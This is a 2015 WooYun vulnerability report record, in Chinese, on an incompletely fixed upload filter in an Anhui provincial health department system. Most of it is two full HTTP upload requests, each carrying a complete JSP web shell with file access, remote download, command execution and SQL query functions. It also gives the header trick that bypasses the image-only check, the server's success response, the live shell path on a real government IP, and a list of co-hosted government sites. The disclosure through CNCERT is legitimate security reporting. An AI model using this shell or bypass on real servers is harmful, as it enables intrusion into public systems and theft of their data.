{"id": 30055, "wybug_id": "wooyun-2015-0117617", "wybug_title": "安徽省卫生厅某系统上传绕过再次导致被getshell（修复不完整）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "JiuShao", "wybug_date": "2015-06-02 10:42", "wybug_open_date": "2015-07-20 18:26", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件操作参数未加过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向公众公开  简要描述： 神器在手，wb我有 详细说明：  安徽省卫生厅某系统上传绕过再次导致被getshell（修复不完整）首先看 WooYun: 安徽省卫生厅某系统任意文件上传导致服务器沦陷 任意文件上传  不过修复了  不够彻底  继续上传  （本来想上传图片的   图片服务器貌似挂了）做了一下限制   只能上传图片  抓个包 \nPOST /defaultroot/public/jsp/singleupload.jsp?path=desktop&mode=add&hiddenName=unitImgSaveName&visualName=unitImgName HTTP/1.1Accept: image/gif, image/jpeg, image/pjpeg, image/pjpeg, jsp application/msword, application/vnd.ms-excel, application/vnd.ms-powerpoint, */*Referer: http://220.178.116.78:7001/defaultroot/public/jsp/singleupload.jsp?path=desktop&mode=add&hiddenName=unitImgSaveName&visualName=unitImgNameAccept-Language: zh-cnUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0)Content-Type: multipart/form-data; boundary=---------------------------7df3d81750276Accept-Encoding: gzip, deflateHost: 220.178.116.78:7001Content-Length: 87639Proxy-Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=cRjwVsbPMP4wnFhZ3Ct1nSrTXTJp9D2yHLBdKZqgxZcXCmqFj7TM!530927824-----------------------------7df3d81750276Content-Disposition: form-data; name=\"photo\"; filename=\"jiushao.jsp\"Content-Type: text/plain<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!String Pwd = \"jiushao\";\tString EC(String s, String c) throws Exception {\t\treturn s;\t}//new String(s.getBytes(\"ISO-8859-1\"),c);}\tConnection GC(String s) throws Exception {\t\tString[] x = s.trim().split(\"\\r\\n\");\t\tClass.forName(x[0].trim()).newInstance();\t\tConnection c = DriverManager.getConnection(x[1].trim());\t\tif (x.length > 2) {\t\t\tc.setCatalog(x[2].trim());\t\t}\t\treturn c;\t}\tvoid AA(StringBuffer sb) throws Exception {\t\tFile r[] = File.listRoots();\t\tfor (int i = 0; i < r.length; i++) {\t\t\tsb.append(r[i].toString().substring(0, 2));\t\t}\t}\tvoid BB(String s, StringBuffer sb) throws Exception {\t\tFile oF = new File(s), l[] = oF.listFiles();\t\tString sT, sQ, sF = \"\";\t\tjava.util.Date dt;\t\tSimpleDateFormat fm = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\t\tfor (int i = 0; i < l.length; i++) {\t\t\tdt = new java.util.Date(l[i].lastModified());\t\t\tsT = fm.format(dt);\t\t\tsQ = l[i].canRead() ? \"R\" : \"\";\t\t\tsQ += l[i].canWrite() ? \" W\" : \"\";\t\t\tif (l[i].isDirectory()) {\t\t\t\tsb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()\t\t\t\t\t\t+ \"\\t\" + sQ + \"\\n\");\t\t\t} else {\t\t\t\tsF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"\t\t\t\t\t\t+ sQ + \"\\n\";\t\t\t}\t\t}\t\tsb.append(sF);\t}\tvoid EE(String s) throws Exception {\t\tFile f = new File(s);\t\tif (f.isDirectory()) {\t\t\tFile x[] = f.listFiles();\t\t\tfor (int k = 0; k < x.length; k++) {\t\t\t\tif (!x[k].delete()) {\t\t\t\t\tEE(x[k].getPath());\t\t\t\t}\t\t\t}\t\t}\t\tf.delete();\t}\tvoid FF(String s, HttpServletResponse r) throws Exception {\t\tint n;\t\tbyte[] b = new byte[512];\t\tr.reset();\t\tServletOutputStream os = r.getOutputStream();\t\tBufferedInputStream is = new BufferedInputStream(new FileInputStream(s));\t\tos.write((\"->\" + \"|\").getBytes(), 0, 3);\t\twhile ((n = is.read(b, 0, 512)) != -1) {\t\t\tos.write(b, 0, n);\t\t}\t\tos.write((\"|\" + \"<-\").getBytes(), 0, 3);\t\tos.close();\t\tis.close();\t}\tvoid GG(String s, String d) throws Exception {\t\tString h = \"0123456789ABCDEF\";\t\tint n;\t\tFile f = new File(s);\t\tf.createNewFile();\t\tFileOutputStream os = new FileOutputStream(f);\t\tfor (int i = 0; i < d.length(); i += 2) {\t\t\tos\t\t\t\t\t.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d\t\t\t\t\t\t\t.charAt(i + 1))));\t\t}\t\tos.close();\t}\tvoid HH(String s, String d) throws Exception {\t\tFile sf = new File(s), df = new File(d);\t\tif (sf.isDirectory()) {\t\t\tif (!df.exists()) {\t\t\t\tdf.mkdir();\t\t\t}\t\t\tFile z[] = sf.listFiles();\t\t\tfor (int j = 0; j < z.length; j++) {\t\t\t\tHH(s + \"/\" + z[j].getName(), d + \"/\" + z[j].getName());\t\t\t}\t\t} else {\t\t\tFileInputStream is = new FileInputStream(sf);\t\t\tFileOutputStream os = new FileOutputStream(df);\t\t\tint n;\t\t\tbyte[] b = new byte[512];\t\t\twhile ((n = is.read(b, 0, 512)) != -1) {\t\t\t\tos.write(b, 0, n);\t\t\t}\t\t\tis.close();\t\t\tos.close();\t\t}\t}\tvoid II(String s, String d) throws Exception {\t\tFile sf = new File(s), df = new File(d);\t\tsf.renameTo(df);\t}\tvoid JJ(String s) throws Exception {\t\tFile f = new File(s);\t\tf.mkdir();\t}\tvoid KK(String s, String t) throws Exception {\t\tFile f = new File(s);\t\tSimpleDateFormat fm = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\t\tjava.util.Date dt = fm.parse(t);\t\tf.setLastModified(dt.getTime());\t}\tvoid LL(String s, String d) throws Exception {\t\tURL u = new URL(s);\t\tint n;\t\tFileOutputStream os = new FileOutputStream(d);\t\tHttpURLConnection h = (HttpURLConnection) u.openConnection();\t\tInputStream is = h.getInputStream();\t\tbyte[] b = new byte[512];\t\twhile ((n = is.read(b, 0, 512)) != -1) {\t\t\tos.write(b, 0, n);\t\t}\t\tos.close();\t\tis.close();\t\th.disconnect();\t}\tvoid MM(InputStream is, StringBuffer sb) throws Exception {\t\tString l;\t\tBufferedReader br = new BufferedReader(new InputStreamReader(is));\t\twhile ((l = br.readLine()) != null) {\t\t\tsb.append(l + \"\\r\\n\");\t\t}\t}\tvoid NN(String s, StringBuffer sb) throws Exception {\t\tConnection c = GC(s);\t\tResultSet r = c.getMetaData().getCatalogs();\t\twhile (r.next()) {\t\t\tsb.append(r.getString(1) + \"\\t\");\t\t}\t\tr.close();\t\tc.close();\t}\tvoid OO(String s, StringBuffer sb) throws Exception {\t\tConnection c = GC(s);\t\tString[] t = { \"TABLE\" };\t\tResultSet r = c.getMetaData().getTables(null, null, \"%\", t);\t\twhile (r.next()) {\t\t\tsb.append(r.getString(\"TABLE_NAME\") + \"\\t\");\t\t}\t\tr.close();\t\tc.close();\t}\tvoid PP(String s, StringBuffer sb) throws Exception {\t\tString[] x = s.trim().split(\"\\r\\n\");\t\tConnection c = GC(s);\t\tStatement m = c.createStatement(1005, 1007);\t\tResultSet r = m.executeQuery(\"select * from \" + x[3]);\t\tResultSetMetaData d = r.getMetaData();\t\tfor (int i = 1; i <= d.getColumnCount(); i++) {\t\t\tsb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)\t\t\t\t\t+ \")\\t\");\t\t}\t\tr.close();\t\tm.close();\t\tc.close();\t}\tvoid QQ(String cs, String s, String q, StringBuffer sb) throws Exception {\t\tint i;\t\tConnection c = GC(s);\t\tStatement m = c.createStatement(1005, 1008);\t\ttry {\t\t\tResultSet r = m.executeQuery(q);\t\t\tResultSetMetaData d = r.getMetaData();\t\t\tint n = d.getColumnCount();\t\t\tfor (i = 1; i <= n; i++) {\t\t\t\tsb.append(d.getColumnName(i) + \"\\t|\\t\");\t\t\t}\t\t\tsb.append(\"\\r\\n\");\t\t\twhile (r.next()) {\t\t\t\tfor (i = 1; i <= n; i++) {\t\t\t\t\tsb.append(EC(r.getString(i), cs) + \"\\t|\\t\");\t\t\t\t}\t\t\t\tsb.append(\"\\r\\n\");\t\t\t}\t\t\tr.close();\t\t} catch (Exception e) {\t\t\tsb.append(\"Result\\t|\\t\\r\\n\");\t\t\ttry {\t\t\t\tm.executeUpdate(q);\t\t\t\tsb.append(\"Execute Successfully!\\t|\\t\\r\\n\");\t\t\t} catch (Exception ee) {\t\t\t\tsb.append(ee.toString() + \"\\t|\\t\\r\\n\");\t\t\t}\t\t}\t\tm.close();\t\tc.close();\t}%>\t\t<%\tString cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z0\") + \"\";\trequest.setCharacterEncoding(cs);\tresponse.setContentType(\"text/html;charset=\" + cs);\tString Z = EC(request.getParameter(Pwd) + \"\", cs);\tString z1 = EC(request.getParameter(\"z1\") + \"\", cs);\tString z2 = EC(request.getParameter(\"z2\") + \"\", cs);\tStringBuffer sb = new StringBuffer(\"\");\ttry {\t\tsb.append(\"->\" + \"|\");\t\tif (Z.equals(\"A\")) {\t\t\tString s = new File(application.getRealPath(request\t\t\t\t\t.getRequestURI())).getParent();\t\t\tsb.append(s + \"\\t\");\t\t\tif (!s.substring(0, 1).equals(\"/\")) {\t\t\t\tAA(sb);\t\t\t}\t\t} else if (Z.equals(\"B\")) {\t\t\tBB(z1, sb);\t\t} else if (Z.equals(\"C\")) {\t\t\tString l = \"\";\t\t\tBufferedReader br = new BufferedReader(\t\t\t\t\tnew InputStreamReader(new FileInputStream(new File(\t\t\t\t\t\t\tz1))));\t\t\twhile ((l = br.readLine()) != null) {\t\t\t\tsb.append(l + \"\\r\\n\");\t\t\t}\t\t\tbr.close();\t\t} else if (Z.equals(\"D\")) {\t\t\tBufferedWriter bw = new BufferedWriter(\t\t\t\t\tnew OutputStreamWriter(new FileOutputStream(\t\t\t\t\t\t\tnew File(z1))));\t\t\tbw.write(z2);\t\t\tbw.close();\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"E\")) {\t\t\tEE(z1);\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"F\")) {\t\t\tFF(z1, response);\t\t} else if (Z.equals(\"G\")) {\t\t\tGG(z1, z2);\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"H\")) {\t\t\tHH(z1, z2);\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"I\")) {\t\t\tII(z1, z2);\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"J\")) {\t\t\tJJ(z1);\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"K\")) {\t\t\tKK(z1, z2);\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"L\")) {\t\t\tLL(z1, z2);\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"M\")) {\t\t\tString[] c = { z1.substring(2), z1.substring(0, 2), z2 };\t\t\tProcess p = Runtime.getRuntime().exec(c);\t\t\tMM(p.getInputStream(), sb);\t\t\tMM(p.getErrorStream(), sb);\t\t} else if (Z.equals(\"N\")) {\t\t\tNN(z1, sb);\t\t} else if (Z.equals(\"O\")) {\t\t\tOO(z1, sb);\t\t} else if (Z.equals(\"P\")) {\t\t\tPP(z1, sb);\t\t} else if (Z.equals(\"Q\")) {\t\t\tQQ(cs, z1, z2, sb);\t\t}\t} catch (Exception e) {\t\tsb.append(\"ERROR\" + \":// \" + e.toString());\t}\tsb.append(\"|\" + \"<-\");\tout.print(sb.toString());%>-----------------------------7df3d81750276Content-Disposition: form-data; name=\"submit\"ä¸ä¼ -----------------------------7df3d81750276--\n修改包   \nPOST /defaultroot/public/jsp/singleupload.jsp?path=desktop&mode=add&hiddenName=unitImgSaveName&visualName=unitImgName HTTP/1.1Accept: image/gif, image/jpeg, image/pjpeg, image/pjpeg, jsp application/msword, application/vnd.ms-excel, application/vnd.ms-powerpoint, */*Referer: http://220.178.116.78:7001/defaultroot/public/jsp/singleupload.jsp?path=desktop&mode=add&hiddenName=unitImgSaveName&visualName=unitImgNameAccept-Language: zh-cnUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0)Content-Type: multipart/form-data; boundary=---------------------------7df3d81750276Accept-Encoding: gzip, deflateHost: 220.178.116.78:7001Content-Length: 87639Proxy-Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=cRjwVsbPMP4wnFhZ3Ct1nSrTXTJp9D2yHLBdKZqgxZcXCmqFj7TM!530927824-----------------------------7df3d81750276Content-Disposition: form-data; name=\"photo\"; filename=\"jiushao.jsp\"Content-Type: text/plain<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!String Pwd = \"jiushao\";\tString EC(String s, String c) throws Exception {\t\treturn s;\t}//new String(s.getBytes(\"ISO-8859-1\"),c);}\tConnection GC(String s) throws Exception {\t\tString[] x = s.trim().split(\"\\r\\n\");\t\tClass.forName(x[0].trim()).newInstance();\t\tConnection c = DriverManager.getConnection(x[1].trim());\t\tif (x.length > 2) {\t\t\tc.setCatalog(x[2].trim());\t\t}\t\treturn c;\t}\tvoid AA(StringBuffer sb) throws Exception {\t\tFile r[] = File.listRoots();\t\tfor (int i = 0; i < r.length; i++) {\t\t\tsb.append(r[i].toString().substring(0, 2));\t\t}\t}\tvoid BB(String s, StringBuffer sb) throws Exception {\t\tFile oF = new File(s), l[] = oF.listFiles();\t\tString sT, sQ, sF = \"\";\t\tjava.util.Date dt;\t\tSimpleDateFormat fm = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\t\tfor (int i = 0; i < l.length; i++) {\t\t\tdt = new java.util.Date(l[i].lastModified());\t\t\tsT = fm.format(dt);\t\t\tsQ = l[i].canRead() ? \"R\" : \"\";\t\t\tsQ += l[i].canWrite() ? \" W\" : \"\";\t\t\tif (l[i].isDirectory()) {\t\t\t\tsb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()\t\t\t\t\t\t+ \"\\t\" + sQ + \"\\n\");\t\t\t} else {\t\t\t\tsF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"\t\t\t\t\t\t+ sQ + \"\\n\";\t\t\t}\t\t}\t\tsb.append(sF);\t}\tvoid EE(String s) throws Exception {\t\tFile f = new File(s);\t\tif (f.isDirectory()) {\t\t\tFile x[] = f.listFiles();\t\t\tfor (int k = 0; k < x.length; k++) {\t\t\t\tif (!x[k].delete()) {\t\t\t\t\tEE(x[k].getPath());\t\t\t\t}\t\t\t}\t\t}\t\tf.delete();\t}\tvoid FF(String s, HttpServletResponse r) throws Exception {\t\tint n;\t\tbyte[] b = new byte[512];\t\tr.reset();\t\tServletOutputStream os = r.getOutputStream();\t\tBufferedInputStream is = new BufferedInputStream(new FileInputStream(s));\t\tos.write((\"->\" + \"|\").getBytes(), 0, 3);\t\twhile ((n = is.read(b, 0, 512)) != -1) {\t\t\tos.write(b, 0, n);\t\t}\t\tos.write((\"|\" + \"<-\").getBytes(), 0, 3);\t\tos.close();\t\tis.close();\t}\tvoid GG(String s, String d) throws Exception {\t\tString h = \"0123456789ABCDEF\";\t\tint n;\t\tFile f = new File(s);\t\tf.createNewFile();\t\tFileOutputStream os = new FileOutputStream(f);\t\tfor (int i = 0; i < d.length(); i += 2) {\t\t\tos\t\t\t\t\t.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d\t\t\t\t\t\t\t.charAt(i + 1))));\t\t}\t\tos.close();\t}\tvoid HH(String s, String d) throws Exception {\t\tFile sf = new File(s), df = new File(d);\t\tif (sf.isDirectory()) {\t\t\tif (!df.exists()) {\t\t\t\tdf.mkdir();\t\t\t}\t\t\tFile z[] = sf.listFiles();\t\t\tfor (int j = 0; j < z.length; j++) {\t\t\t\tHH(s + \"/\" + z[j].getName(), d + \"/\" + z[j].getName());\t\t\t}\t\t} else {\t\t\tFileInputStream is = new FileInputStream(sf);\t\t\tFileOutputStream os = new FileOutputStream(df);\t\t\tint n;\t\t\tbyte[] b = new byte[512];\t\t\twhile ((n = is.read(b, 0, 512)) != -1) {\t\t\t\tos.write(b, 0, n);\t\t\t}\t\t\tis.close();\t\t\tos.close();\t\t}\t}\tvoid II(String s, String d) throws Exception {\t\tFile sf = new File(s), df = new File(d);\t\tsf.renameTo(df);\t}\tvoid JJ(String s) throws Exception {\t\tFile f = new File(s);\t\tf.mkdir();\t}\tvoid KK(String s, String t) throws Exception {\t\tFile f = new File(s);\t\tSimpleDateFormat fm = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\t\tjava.util.Date dt = fm.parse(t);\t\tf.setLastModified(dt.getTime());\t}\tvoid LL(String s, String d) throws Exception {\t\tURL u = new URL(s);\t\tint n;\t\tFileOutputStream os = new FileOutputStream(d);\t\tHttpURLConnection h = (HttpURLConnection) u.openConnection();\t\tInputStream is = h.getInputStream();\t\tbyte[] b = new byte[512];\t\twhile ((n = is.read(b, 0, 512)) != -1) {\t\t\tos.write(b, 0, n);\t\t}\t\tos.close();\t\tis.close();\t\th.disconnect();\t}\tvoid MM(InputStream is, StringBuffer sb) throws Exception {\t\tString l;\t\tBufferedReader br = new BufferedReader(new InputStreamReader(is));\t\twhile ((l = br.readLine()) != null) {\t\t\tsb.append(l + \"\\r\\n\");\t\t}\t}\tvoid NN(String s, StringBuffer sb) throws Exception {\t\tConnection c = GC(s);\t\tResultSet r = c.getMetaData().getCatalogs();\t\twhile (r.next()) {\t\t\tsb.append(r.getString(1) + \"\\t\");\t\t}\t\tr.close();\t\tc.close();\t}\tvoid OO(String s, StringBuffer sb) throws Exception {\t\tConnection c = GC(s);\t\tString[] t = { \"TABLE\" };\t\tResultSet r = c.getMetaData().getTables(null, null, \"%\", t);\t\twhile (r.next()) {\t\t\tsb.append(r.getString(\"TABLE_NAME\") + \"\\t\");\t\t}\t\tr.close();\t\tc.close();\t}\tvoid PP(String s, StringBuffer sb) throws Exception {\t\tString[] x = s.trim().split(\"\\r\\n\");\t\tConnection c = GC(s);\t\tStatement m = c.createStatement(1005, 1007);\t\tResultSet r = m.executeQuery(\"select * from \" + x[3]);\t\tResultSetMetaData d = r.getMetaData();\t\tfor (int i = 1; i <= d.getColumnCount(); i++) {\t\t\tsb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)\t\t\t\t\t+ \")\\t\");\t\t}\t\tr.close();\t\tm.close();\t\tc.close();\t}\tvoid QQ(String cs, String s, String q, StringBuffer sb) throws Exception {\t\tint i;\t\tConnection c = GC(s);\t\tStatement m = c.createStatement(1005, 1008);\t\ttry {\t\t\tResultSet r = m.executeQuery(q);\t\t\tResultSetMetaData d = r.getMetaData();\t\t\tint n = d.getColumnCount();\t\t\tfor (i = 1; i <= n; i++) {\t\t\t\tsb.append(d.getColumnName(i) + \"\\t|\\t\");\t\t\t}\t\t\tsb.append(\"\\r\\n\");\t\t\twhile (r.next()) {\t\t\t\tfor (i = 1; i <= n; i++) {\t\t\t\t\tsb.append(EC(r.getString(i), cs) + \"\\t|\\t\");\t\t\t\t}\t\t\t\tsb.append(\"\\r\\n\");\t\t\t}\t\t\tr.close();\t\t} catch (Exception e) {\t\t\tsb.append(\"Result\\t|\\t\\r\\n\");\t\t\ttry {\t\t\t\tm.executeUpdate(q);\t\t\t\tsb.append(\"Execute Successfully!\\t|\\t\\r\\n\");\t\t\t} catch (Exception ee) {\t\t\t\tsb.append(ee.toString() + \"\\t|\\t\\r\\n\");\t\t\t}\t\t}\t\tm.close();\t\tc.close();\t}%>\t\t<%\tString cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z0\") + \"\";\trequest.setCharacterEncoding(cs);\tresponse.setContentType(\"text/html;charset=\" + cs);\tString Z = EC(request.getParameter(Pwd) + \"\", cs);\tString z1 = EC(request.getParameter(\"z1\") + \"\", cs);\tString z2 = EC(request.getParameter(\"z2\") + \"\", cs);\tStringBuffer sb = new StringBuffer(\"\");\ttry {\t\tsb.append(\"->\" + \"|\");\t\tif (Z.equals(\"A\")) {\t\t\tString s = new File(application.getRealPath(request\t\t\t\t\t.getRequestURI())).getParent();\t\t\tsb.append(s + \"\\t\");\t\t\tif (!s.substring(0, 1).equals(\"/\")) {\t\t\t\tAA(sb);\t\t\t}\t\t} else if (Z.equals(\"B\")) {\t\t\tBB(z1, sb);\t\t} else if (Z.equals(\"C\")) {\t\t\tString l = \"\";\t\t\tBufferedReader br = new BufferedReader(\t\t\t\t\tnew InputStreamReader(new FileInputStream(new File(\t\t\t\t\t\t\tz1))));\t\t\twhile ((l = br.readLine()) != null) {\t\t\t\tsb.append(l + \"\\r\\n\");\t\t\t}\t\t\tbr.close();\t\t} else if (Z.equals(\"D\")) {\t\t\tBufferedWriter bw = new BufferedWriter(\t\t\t\t\tnew OutputStreamWriter(new FileOutputStream(\t\t\t\t\t\t\tnew File(z1))));\t\t\tbw.write(z2);\t\t\tbw.close();\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"E\")) {\t\t\tEE(z1);\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"F\")) {\t\t\tFF(z1, response);\t\t} else if (Z.equals(\"G\")) {\t\t\tGG(z1, z2);\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"H\")) {\t\t\tHH(z1, z2);\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"I\")) {\t\t\tII(z1, z2);\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"J\")) {\t\t\tJJ(z1);\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"K\")) {\t\t\tKK(z1, z2);\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"L\")) {\t\t\tLL(z1, z2);\t\t\tsb.append(\"1\");\t\t} else if (Z.equals(\"M\")) {\t\t\tString[] c = { z1.substring(2), z1.substring(0, 2), z2 };\t\t\tProcess p = Runtime.getRuntime().exec(c);\t\t\tMM(p.getInputStream(), sb);\t\t\tMM(p.getErrorStream(), sb);\t\t} else if (Z.equals(\"N\")) {\t\t\tNN(z1, sb);\t\t} else if (Z.equals(\"O\")) {\t\t\tOO(z1, sb);\t\t} else if (Z.equals(\"P\")) {\t\t\tPP(z1, sb);\t\t} else if (Z.equals(\"Q\")) {\t\t\tQQ(cs, z1, z2, sb);\t\t}\t} catch (Exception e) {\t\tsb.append(\"ERROR\" + \":// \" + e.toString());\t}\tsb.append(\"|\" + \"<-\");\tout.print(sb.toString());%>-----------------------------7df3d81750276Content-Disposition: form-data; name=\"submit\"ä¸ä¼ -----------------------------7df3d81750276--\n关键在这里Accept: image/gif, image/jpeg, image/pjpeg, image/pjpeg, Accept: image/gif, image/jpeg, image/pjpeg, image/pjpeg, jsp添加一个jsp后缀   直接上传  \nHTTP/1.1 200 OKDate: Mon, 01 Jun 2015 13:37:51 GMTContent-Length: 3251Content-Type: text/html; charset=UTF-8                    <SCRIPT LANGUAGE=\"JavaScript\">\t\t  <!--\t\t  alert(\"éä»¶ä¸ä¼ æåï¼\");\t\t  opener.document.all.unitImgName.value = \"jiushao.jsp\";\t\t  opener.document.all.unitImgSaveName.value = \"2015060121205221333621364.jsp\";\t\t  window.close();                  //-->            </SCRIPT>            \t  <HTML><HEAD><TITLE>ä¸ä¼ éä»¶</TITLE><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"></HEAD><style type=\"text/css\"></style><BODY  bgcolor=\"E8ECED\"><br><div align=\"center\"><P><font color=\"#3366CC\">è¯·éæ©è¦ä¸ä¼ çæä»¶</font></p></div><TABLE width=\"80%\" align=\"center\" border=0><CENTER><FORM ENCTYPE = \"multipart/form-data\" NAME =\"frm\" ACTION = \"singleupload.jsp?path=desktop&mode=add&hiddenName=unitImgSaveName&visualName=unitImgName\"    METHOD=\"POST\" onsubmit=\"javascript:return check();\">  <TR>     <TD align=\"center\"><INPUT  type=\"file\" name=\"photo\" size=\"30\" value=\"\"></TD>  </TR>  <tr>    <td>&nbsp;</td>  </tr>  <TR>     <TD align=\"center\"><INPUT NAME=\"submit\" VALUE=\"ä¸ä¼ \" TYPE=\"submit\">\t     &nbsp;&nbsp;<INPUT NAME=\"reset\" VALUE=\"éç½®\" TYPE=\"reset\">     </TD>  </TR>  <tr>    <td>&nbsp;</td>  </tr>  <tr>    <td align=\"center\">      <!--<img src=\"/defaultroot/images/boder_left.gif\" hspace=\"5\" vspace=\"5\" id=\"preview\" >-->    </td>  </tr></FORM></CENTER></TABLE></BODY></HTML><script language=\"javascript\">var img=null;function check(){    if(document.all.photo.value==\"\"){        alert(\"è¯·éæ©ä¸ä¼ éä»¶!\");        return false;    }    try{        if(img) img.removeNode(true);        img=document.createElement(\"img\");        img.style.position=\"absolute\";        img.style.visibility=\"hidden\";        img.attachEvent(\"onreadystatechange\",orsc);        img.attachEvent(\"onerror\",oe);        document.body.insertAdjacentElement(\"beforeend\",img);        var fileValue=document.all.photo.value;        img.src=fileValue;        fileValue=fileValue.toLowerCase();        fileValue=fileValue.substring(fileValue.lastIndexOf(\".\")+1);        if(\"jpg,gif,bmp,png\".indexOf(fileValue)>=0){            var fileOffsetWidth=img.offsetWidth;            var fileOffsetHeight=img.offsetHeight;            if(99>fileOffsetWidth || 19>fileOffsetHeight){                    if(!confirm(\"ç³»ç»åè®¸æ¨ä¸ä¼ çå¾çæå°ä¸º100X20,èæ¨ä¸ä¼ çå¾çå¤§å°ä¸º\"+fileOffsetWidth+\"X\"+fileOffsetHeight+\",è¿å°å¯¼è´æ¾ç¤ºä¸æ­£å¸¸!\\næ¨ç¡®å®è¦ä¸ä¼ å?\")){                        return false;                    }            }else if(101<fileOffsetWidth || 21<fileOffsetHeight){                    if(!confirm(\"ç³»ç»åè®¸æ¨ä¸ä¼ çå¾çæå¤§ä¸º100X20,èæ¨ä¸ä¼ çå¾çå¤§å°ä¸º\"+fileOffsetWidth+\"X\"+fileOffsetHeight+\",è¿å°å¯¼è´æ¾ç¤ºä¸æ­£å¸¸!\\næ¨ç¡®å®è¦ä¸ä¼ å?\")){                        return false;                    }            }        }else{            alert(\"æ¨åªè½ä¸ä¼ jpg,gif,bmp,jpegç­æ ¼å¼çå¾ç!\");            return false;        }    }catch(e){        alert(e);    }}function oe(){}function orsc(){    if(img.readyState!=\"complete\")return false;}</script>\nshell地址:http://220.178.116.78:7001/defaultroot/upload/desktop/2015060121205221333621364.jsp     jiushao   同服网站全部沦陷   http://jbyw.ahyycg.cn 【jbyw.ahyycg.cn】http://ahyycg.cn 【用户名： - 安徽省医药集中采购平台】http://www.ahwst.gov.cn:13333 【医疗机构便民服务指南 - ahwstweb80】http://www.ahyycg.cn 【投诉申诉格式】http://xxgk.ahwst.gov.cn 【404_安徽省卫生和计划生育委员会】http://www.ahwjw.gov.cn 【计生技术服务-安徽省卫生和计划生育委员会】http://jy.ahyycg.cn 【安徽省医药集中采购平台】http://220.178.116.78 【通知公告-安徽省卫生和计划生育委员会】http://oa.ahwst.gov.cn 【食品安全知识-安徽省卫生和计划生育委员会】http://zb.ahyycg.cn 【转发 关于规范医疗卫生机构药品采购目录遴选工作的通知 ...】   漏洞证明：  如上   修复方案：  上传验证的好一点  在好一点   版权声明：转载请注明来源 JiuShao@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-06-05 18:25 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给安徽分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}